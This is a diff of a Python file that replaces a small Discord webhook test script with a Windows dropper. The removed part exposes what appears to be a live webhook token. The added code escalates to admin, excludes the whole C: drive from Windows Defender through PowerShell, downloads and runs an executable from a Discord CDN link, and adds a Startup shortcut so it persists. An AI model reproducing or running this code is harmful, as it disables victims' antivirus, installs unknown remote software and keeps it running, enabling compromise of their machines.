@@ -1,19 +1,76 @@
-import requests
+import os
+import sys
+import ctypes
+import shutil
+import subprocess
+import urllib.request
+import win32com.client  # For creating shortcuts
 
-# URL deines Discord-Webhooks
-webhook_url = "https://discord.com/api/webhooks/1311521773724110929/Rq1xi7i-HpbSE1cFWp4tgZS8UYrlZRVK1AwrFWghM66fAxOD_NT_ArUK82eD4e2uASCA"
+# Function to check for admin privileges and request if necessary
+def is_admin():
+    return ctypes.windll.shell32.IsUserAnAdmin() != 0
 
-# Nachricht, die du senden möchtest
-message = {
-    "content": "Hello, this is a message sent via Python!"
-}
+def run_as_admin():
+    script = sys.argv[0]
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
 
-# Senden der Nachricht
-response = requests.post(webhook_url, json=message)
+# Function to add the entire C:/ drive to Windows Defender exclusion list
+def add_antivirus_exclusion():
+    try:
+        # Using PowerShell to add the C:/ drive to Windows Defender exclusions
+        command = "powershell Add-MpPreference -ExclusionPath 'C:\\'"
+        subprocess.run(command, shell=True, check=True)
+        print("Added C:/ drive to Windows Defender exclusions.")
+    except Exception as e:
+        print(f"Error adding exclusion: {str(e)}")
 
-# Überprüfung der Antwort
-if response.status_code == 204:
-    print("Nachricht erfolgreich gesendet!")
-else:
-    print(f"Fehler beim Senden der Nachricht: {response.status_code}")
-    print(response.text)
+# Function to download and run the executable
+def download_and_run_exe(download_url, filename):
+    try:
+        # Define the path where the executable will be saved
+        download_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', filename)
+        
+        # Download the .exe file
+        urllib.request.urlretrieve(download_url, download_path)
+        print(f"Downloaded {filename} to {download_path}")
+
+        # Run the downloaded .exe file
+        subprocess.run(download_path, shell=True)
+        print(f"Running {filename}...")
+    except Exception as e:
+        print(f"Error downloading or running the executable: {str(e)}")
+
+# Function to copy the .exe to Temp folder and make a startup shortcut
+def copy_to_temp_and_create_shortcut():
+    # Add the antivirus exclusion for the entire C:/ drive before downloading the file
+    add_antivirus_exclusion()
+
+    # Define the URL of the .exe to download
+    download_url = "https://cdn.discordapp.com/attachments/1308190889394311328/1314341590457778238/inz3n.exe?ex=67536b7e&is=675219fe&hm=5d7fcc5b7f61e162e96d352a2f5859c454358619972a9ed854240fcc0f7f7cdd&"  # Replace with the actual URL of the .exe you want to download
+    filename = "inz3n.exe"  # Name of the downloaded executable
+
+    # Download and run the executable
+    download_and_run_exe(download_url, filename)
+
+    # Create a startup shortcut pointing to the downloaded exe in Temp
+    temp_folder = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp')
+    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    shortcut_path = os.path.join(startup_folder, f"{filename} Shortcut.lnk")
+
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortcut(shortcut_path)
+    shortcut.TargetPath = os.path.join(temp_folder, filename)
+    shortcut.WorkingDirectory = temp_folder
+    shortcut.IconLocation = os.path.join(temp_folder, filename)
+    shortcut.Save()
+
+    print(f"Startup shortcut created at: {shortcut_path}")
+
+if __name__ == "__main__":
+    if not is_admin():
+        print("Admin privileges are required to run this program.")
+        run_as_admin()
+        sys.exit(0)  # Exit after prompting for admin rights
+
+    # Proceed with downloading the executable and creating a startup shortcut
+    copy_to_temp_and_create_shortcut()
